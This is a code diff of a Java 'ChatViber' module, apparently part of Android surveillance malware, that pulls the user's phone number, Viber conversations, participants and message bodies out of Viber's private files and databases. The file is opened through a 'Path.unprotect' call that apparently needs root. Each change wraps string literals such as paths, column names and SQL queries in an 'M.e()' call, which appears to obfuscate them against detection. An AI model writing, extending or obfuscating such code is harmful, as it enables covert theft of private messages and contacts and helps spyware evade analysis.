@@ -72,7 +72,7 @@ public class ChatViber extends SubModuleChat {
 
 	private String readMyPhoneNumber() {
 		String number = null;
-		String file = "/data/data/com.viber.voip/files/preferences/reg_viber_phone_num";
+		String file = M.e("/data/data/com.viber.voip/files/preferences/reg_viber_phone_num");
 
 		if (Path.unprotect(file, 4, false)) {
 			FileInputStream fileInputStream;
@@ -174,7 +174,7 @@ public class ChatViber extends SubModuleChat {
 
 		final List<ViberConversation> conversations = new ArrayList<ViberConversation>();
 
-		String[] projection = new String[] { "_id", "date", "recipient_number", "conversation_type" };
+		String[] projection = new String[] { M.e("_id"), M.e("date"), M.e("recipient_number"), M.e("conversation_type") };
 		String selection = "date > " + lastViberReadDate;
 
 		RecordVisitor visitor = new RecordVisitor(projection, selection) {
@@ -196,7 +196,7 @@ public class ChatViber extends SubModuleChat {
 		};
 
 
-		helper.traverseRecords("conversations", visitor);
+		helper.traverseRecords(M.e("conversations"), visitor);
 		
 		return conversations;
 	}
@@ -237,7 +237,7 @@ public class ChatViber extends SubModuleChat {
 			}
 		};
 
-		String sqlquery = "SELECT P._id,  I.number, I.display_name, I.contact_name, I.participant_type from participants as P join participants_info as I on P.participant_info_id = I._id where conversation_id = ?";
+		String sqlquery = M.e("SELECT P._id,  I.number, I.display_name, I.contact_name, I.participant_type from participants as P join participants_info as I on P.participant_info_id = I._id where conversation_id = ?");
 		helper.traverseRawQuery(sqlquery, new String[]{ thread_id }, visitor);
 
 	}
@@ -249,8 +249,8 @@ public class ChatViber extends SubModuleChat {
 		try {
 			final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
 
-			String[] projection = new String[] { "_id", "participant_id", "body", "date", "address", "type" };
-			String selection = "conversation_id = " + conversation.id + " and date > " + lastConvId;
+			String[] projection = new String[] { M.e("_id"), M.e("participant_id"), M.e("body"), M.e("date"), M.e("address"), M.e("type") };
+			String selection = M.e("conversation_id = ") + conversation.id + M.e(" and date > ") + lastConvId;
 			String order = "date";
 			RecordVisitor visitor = new RecordVisitor(projection, selection, order) {
 
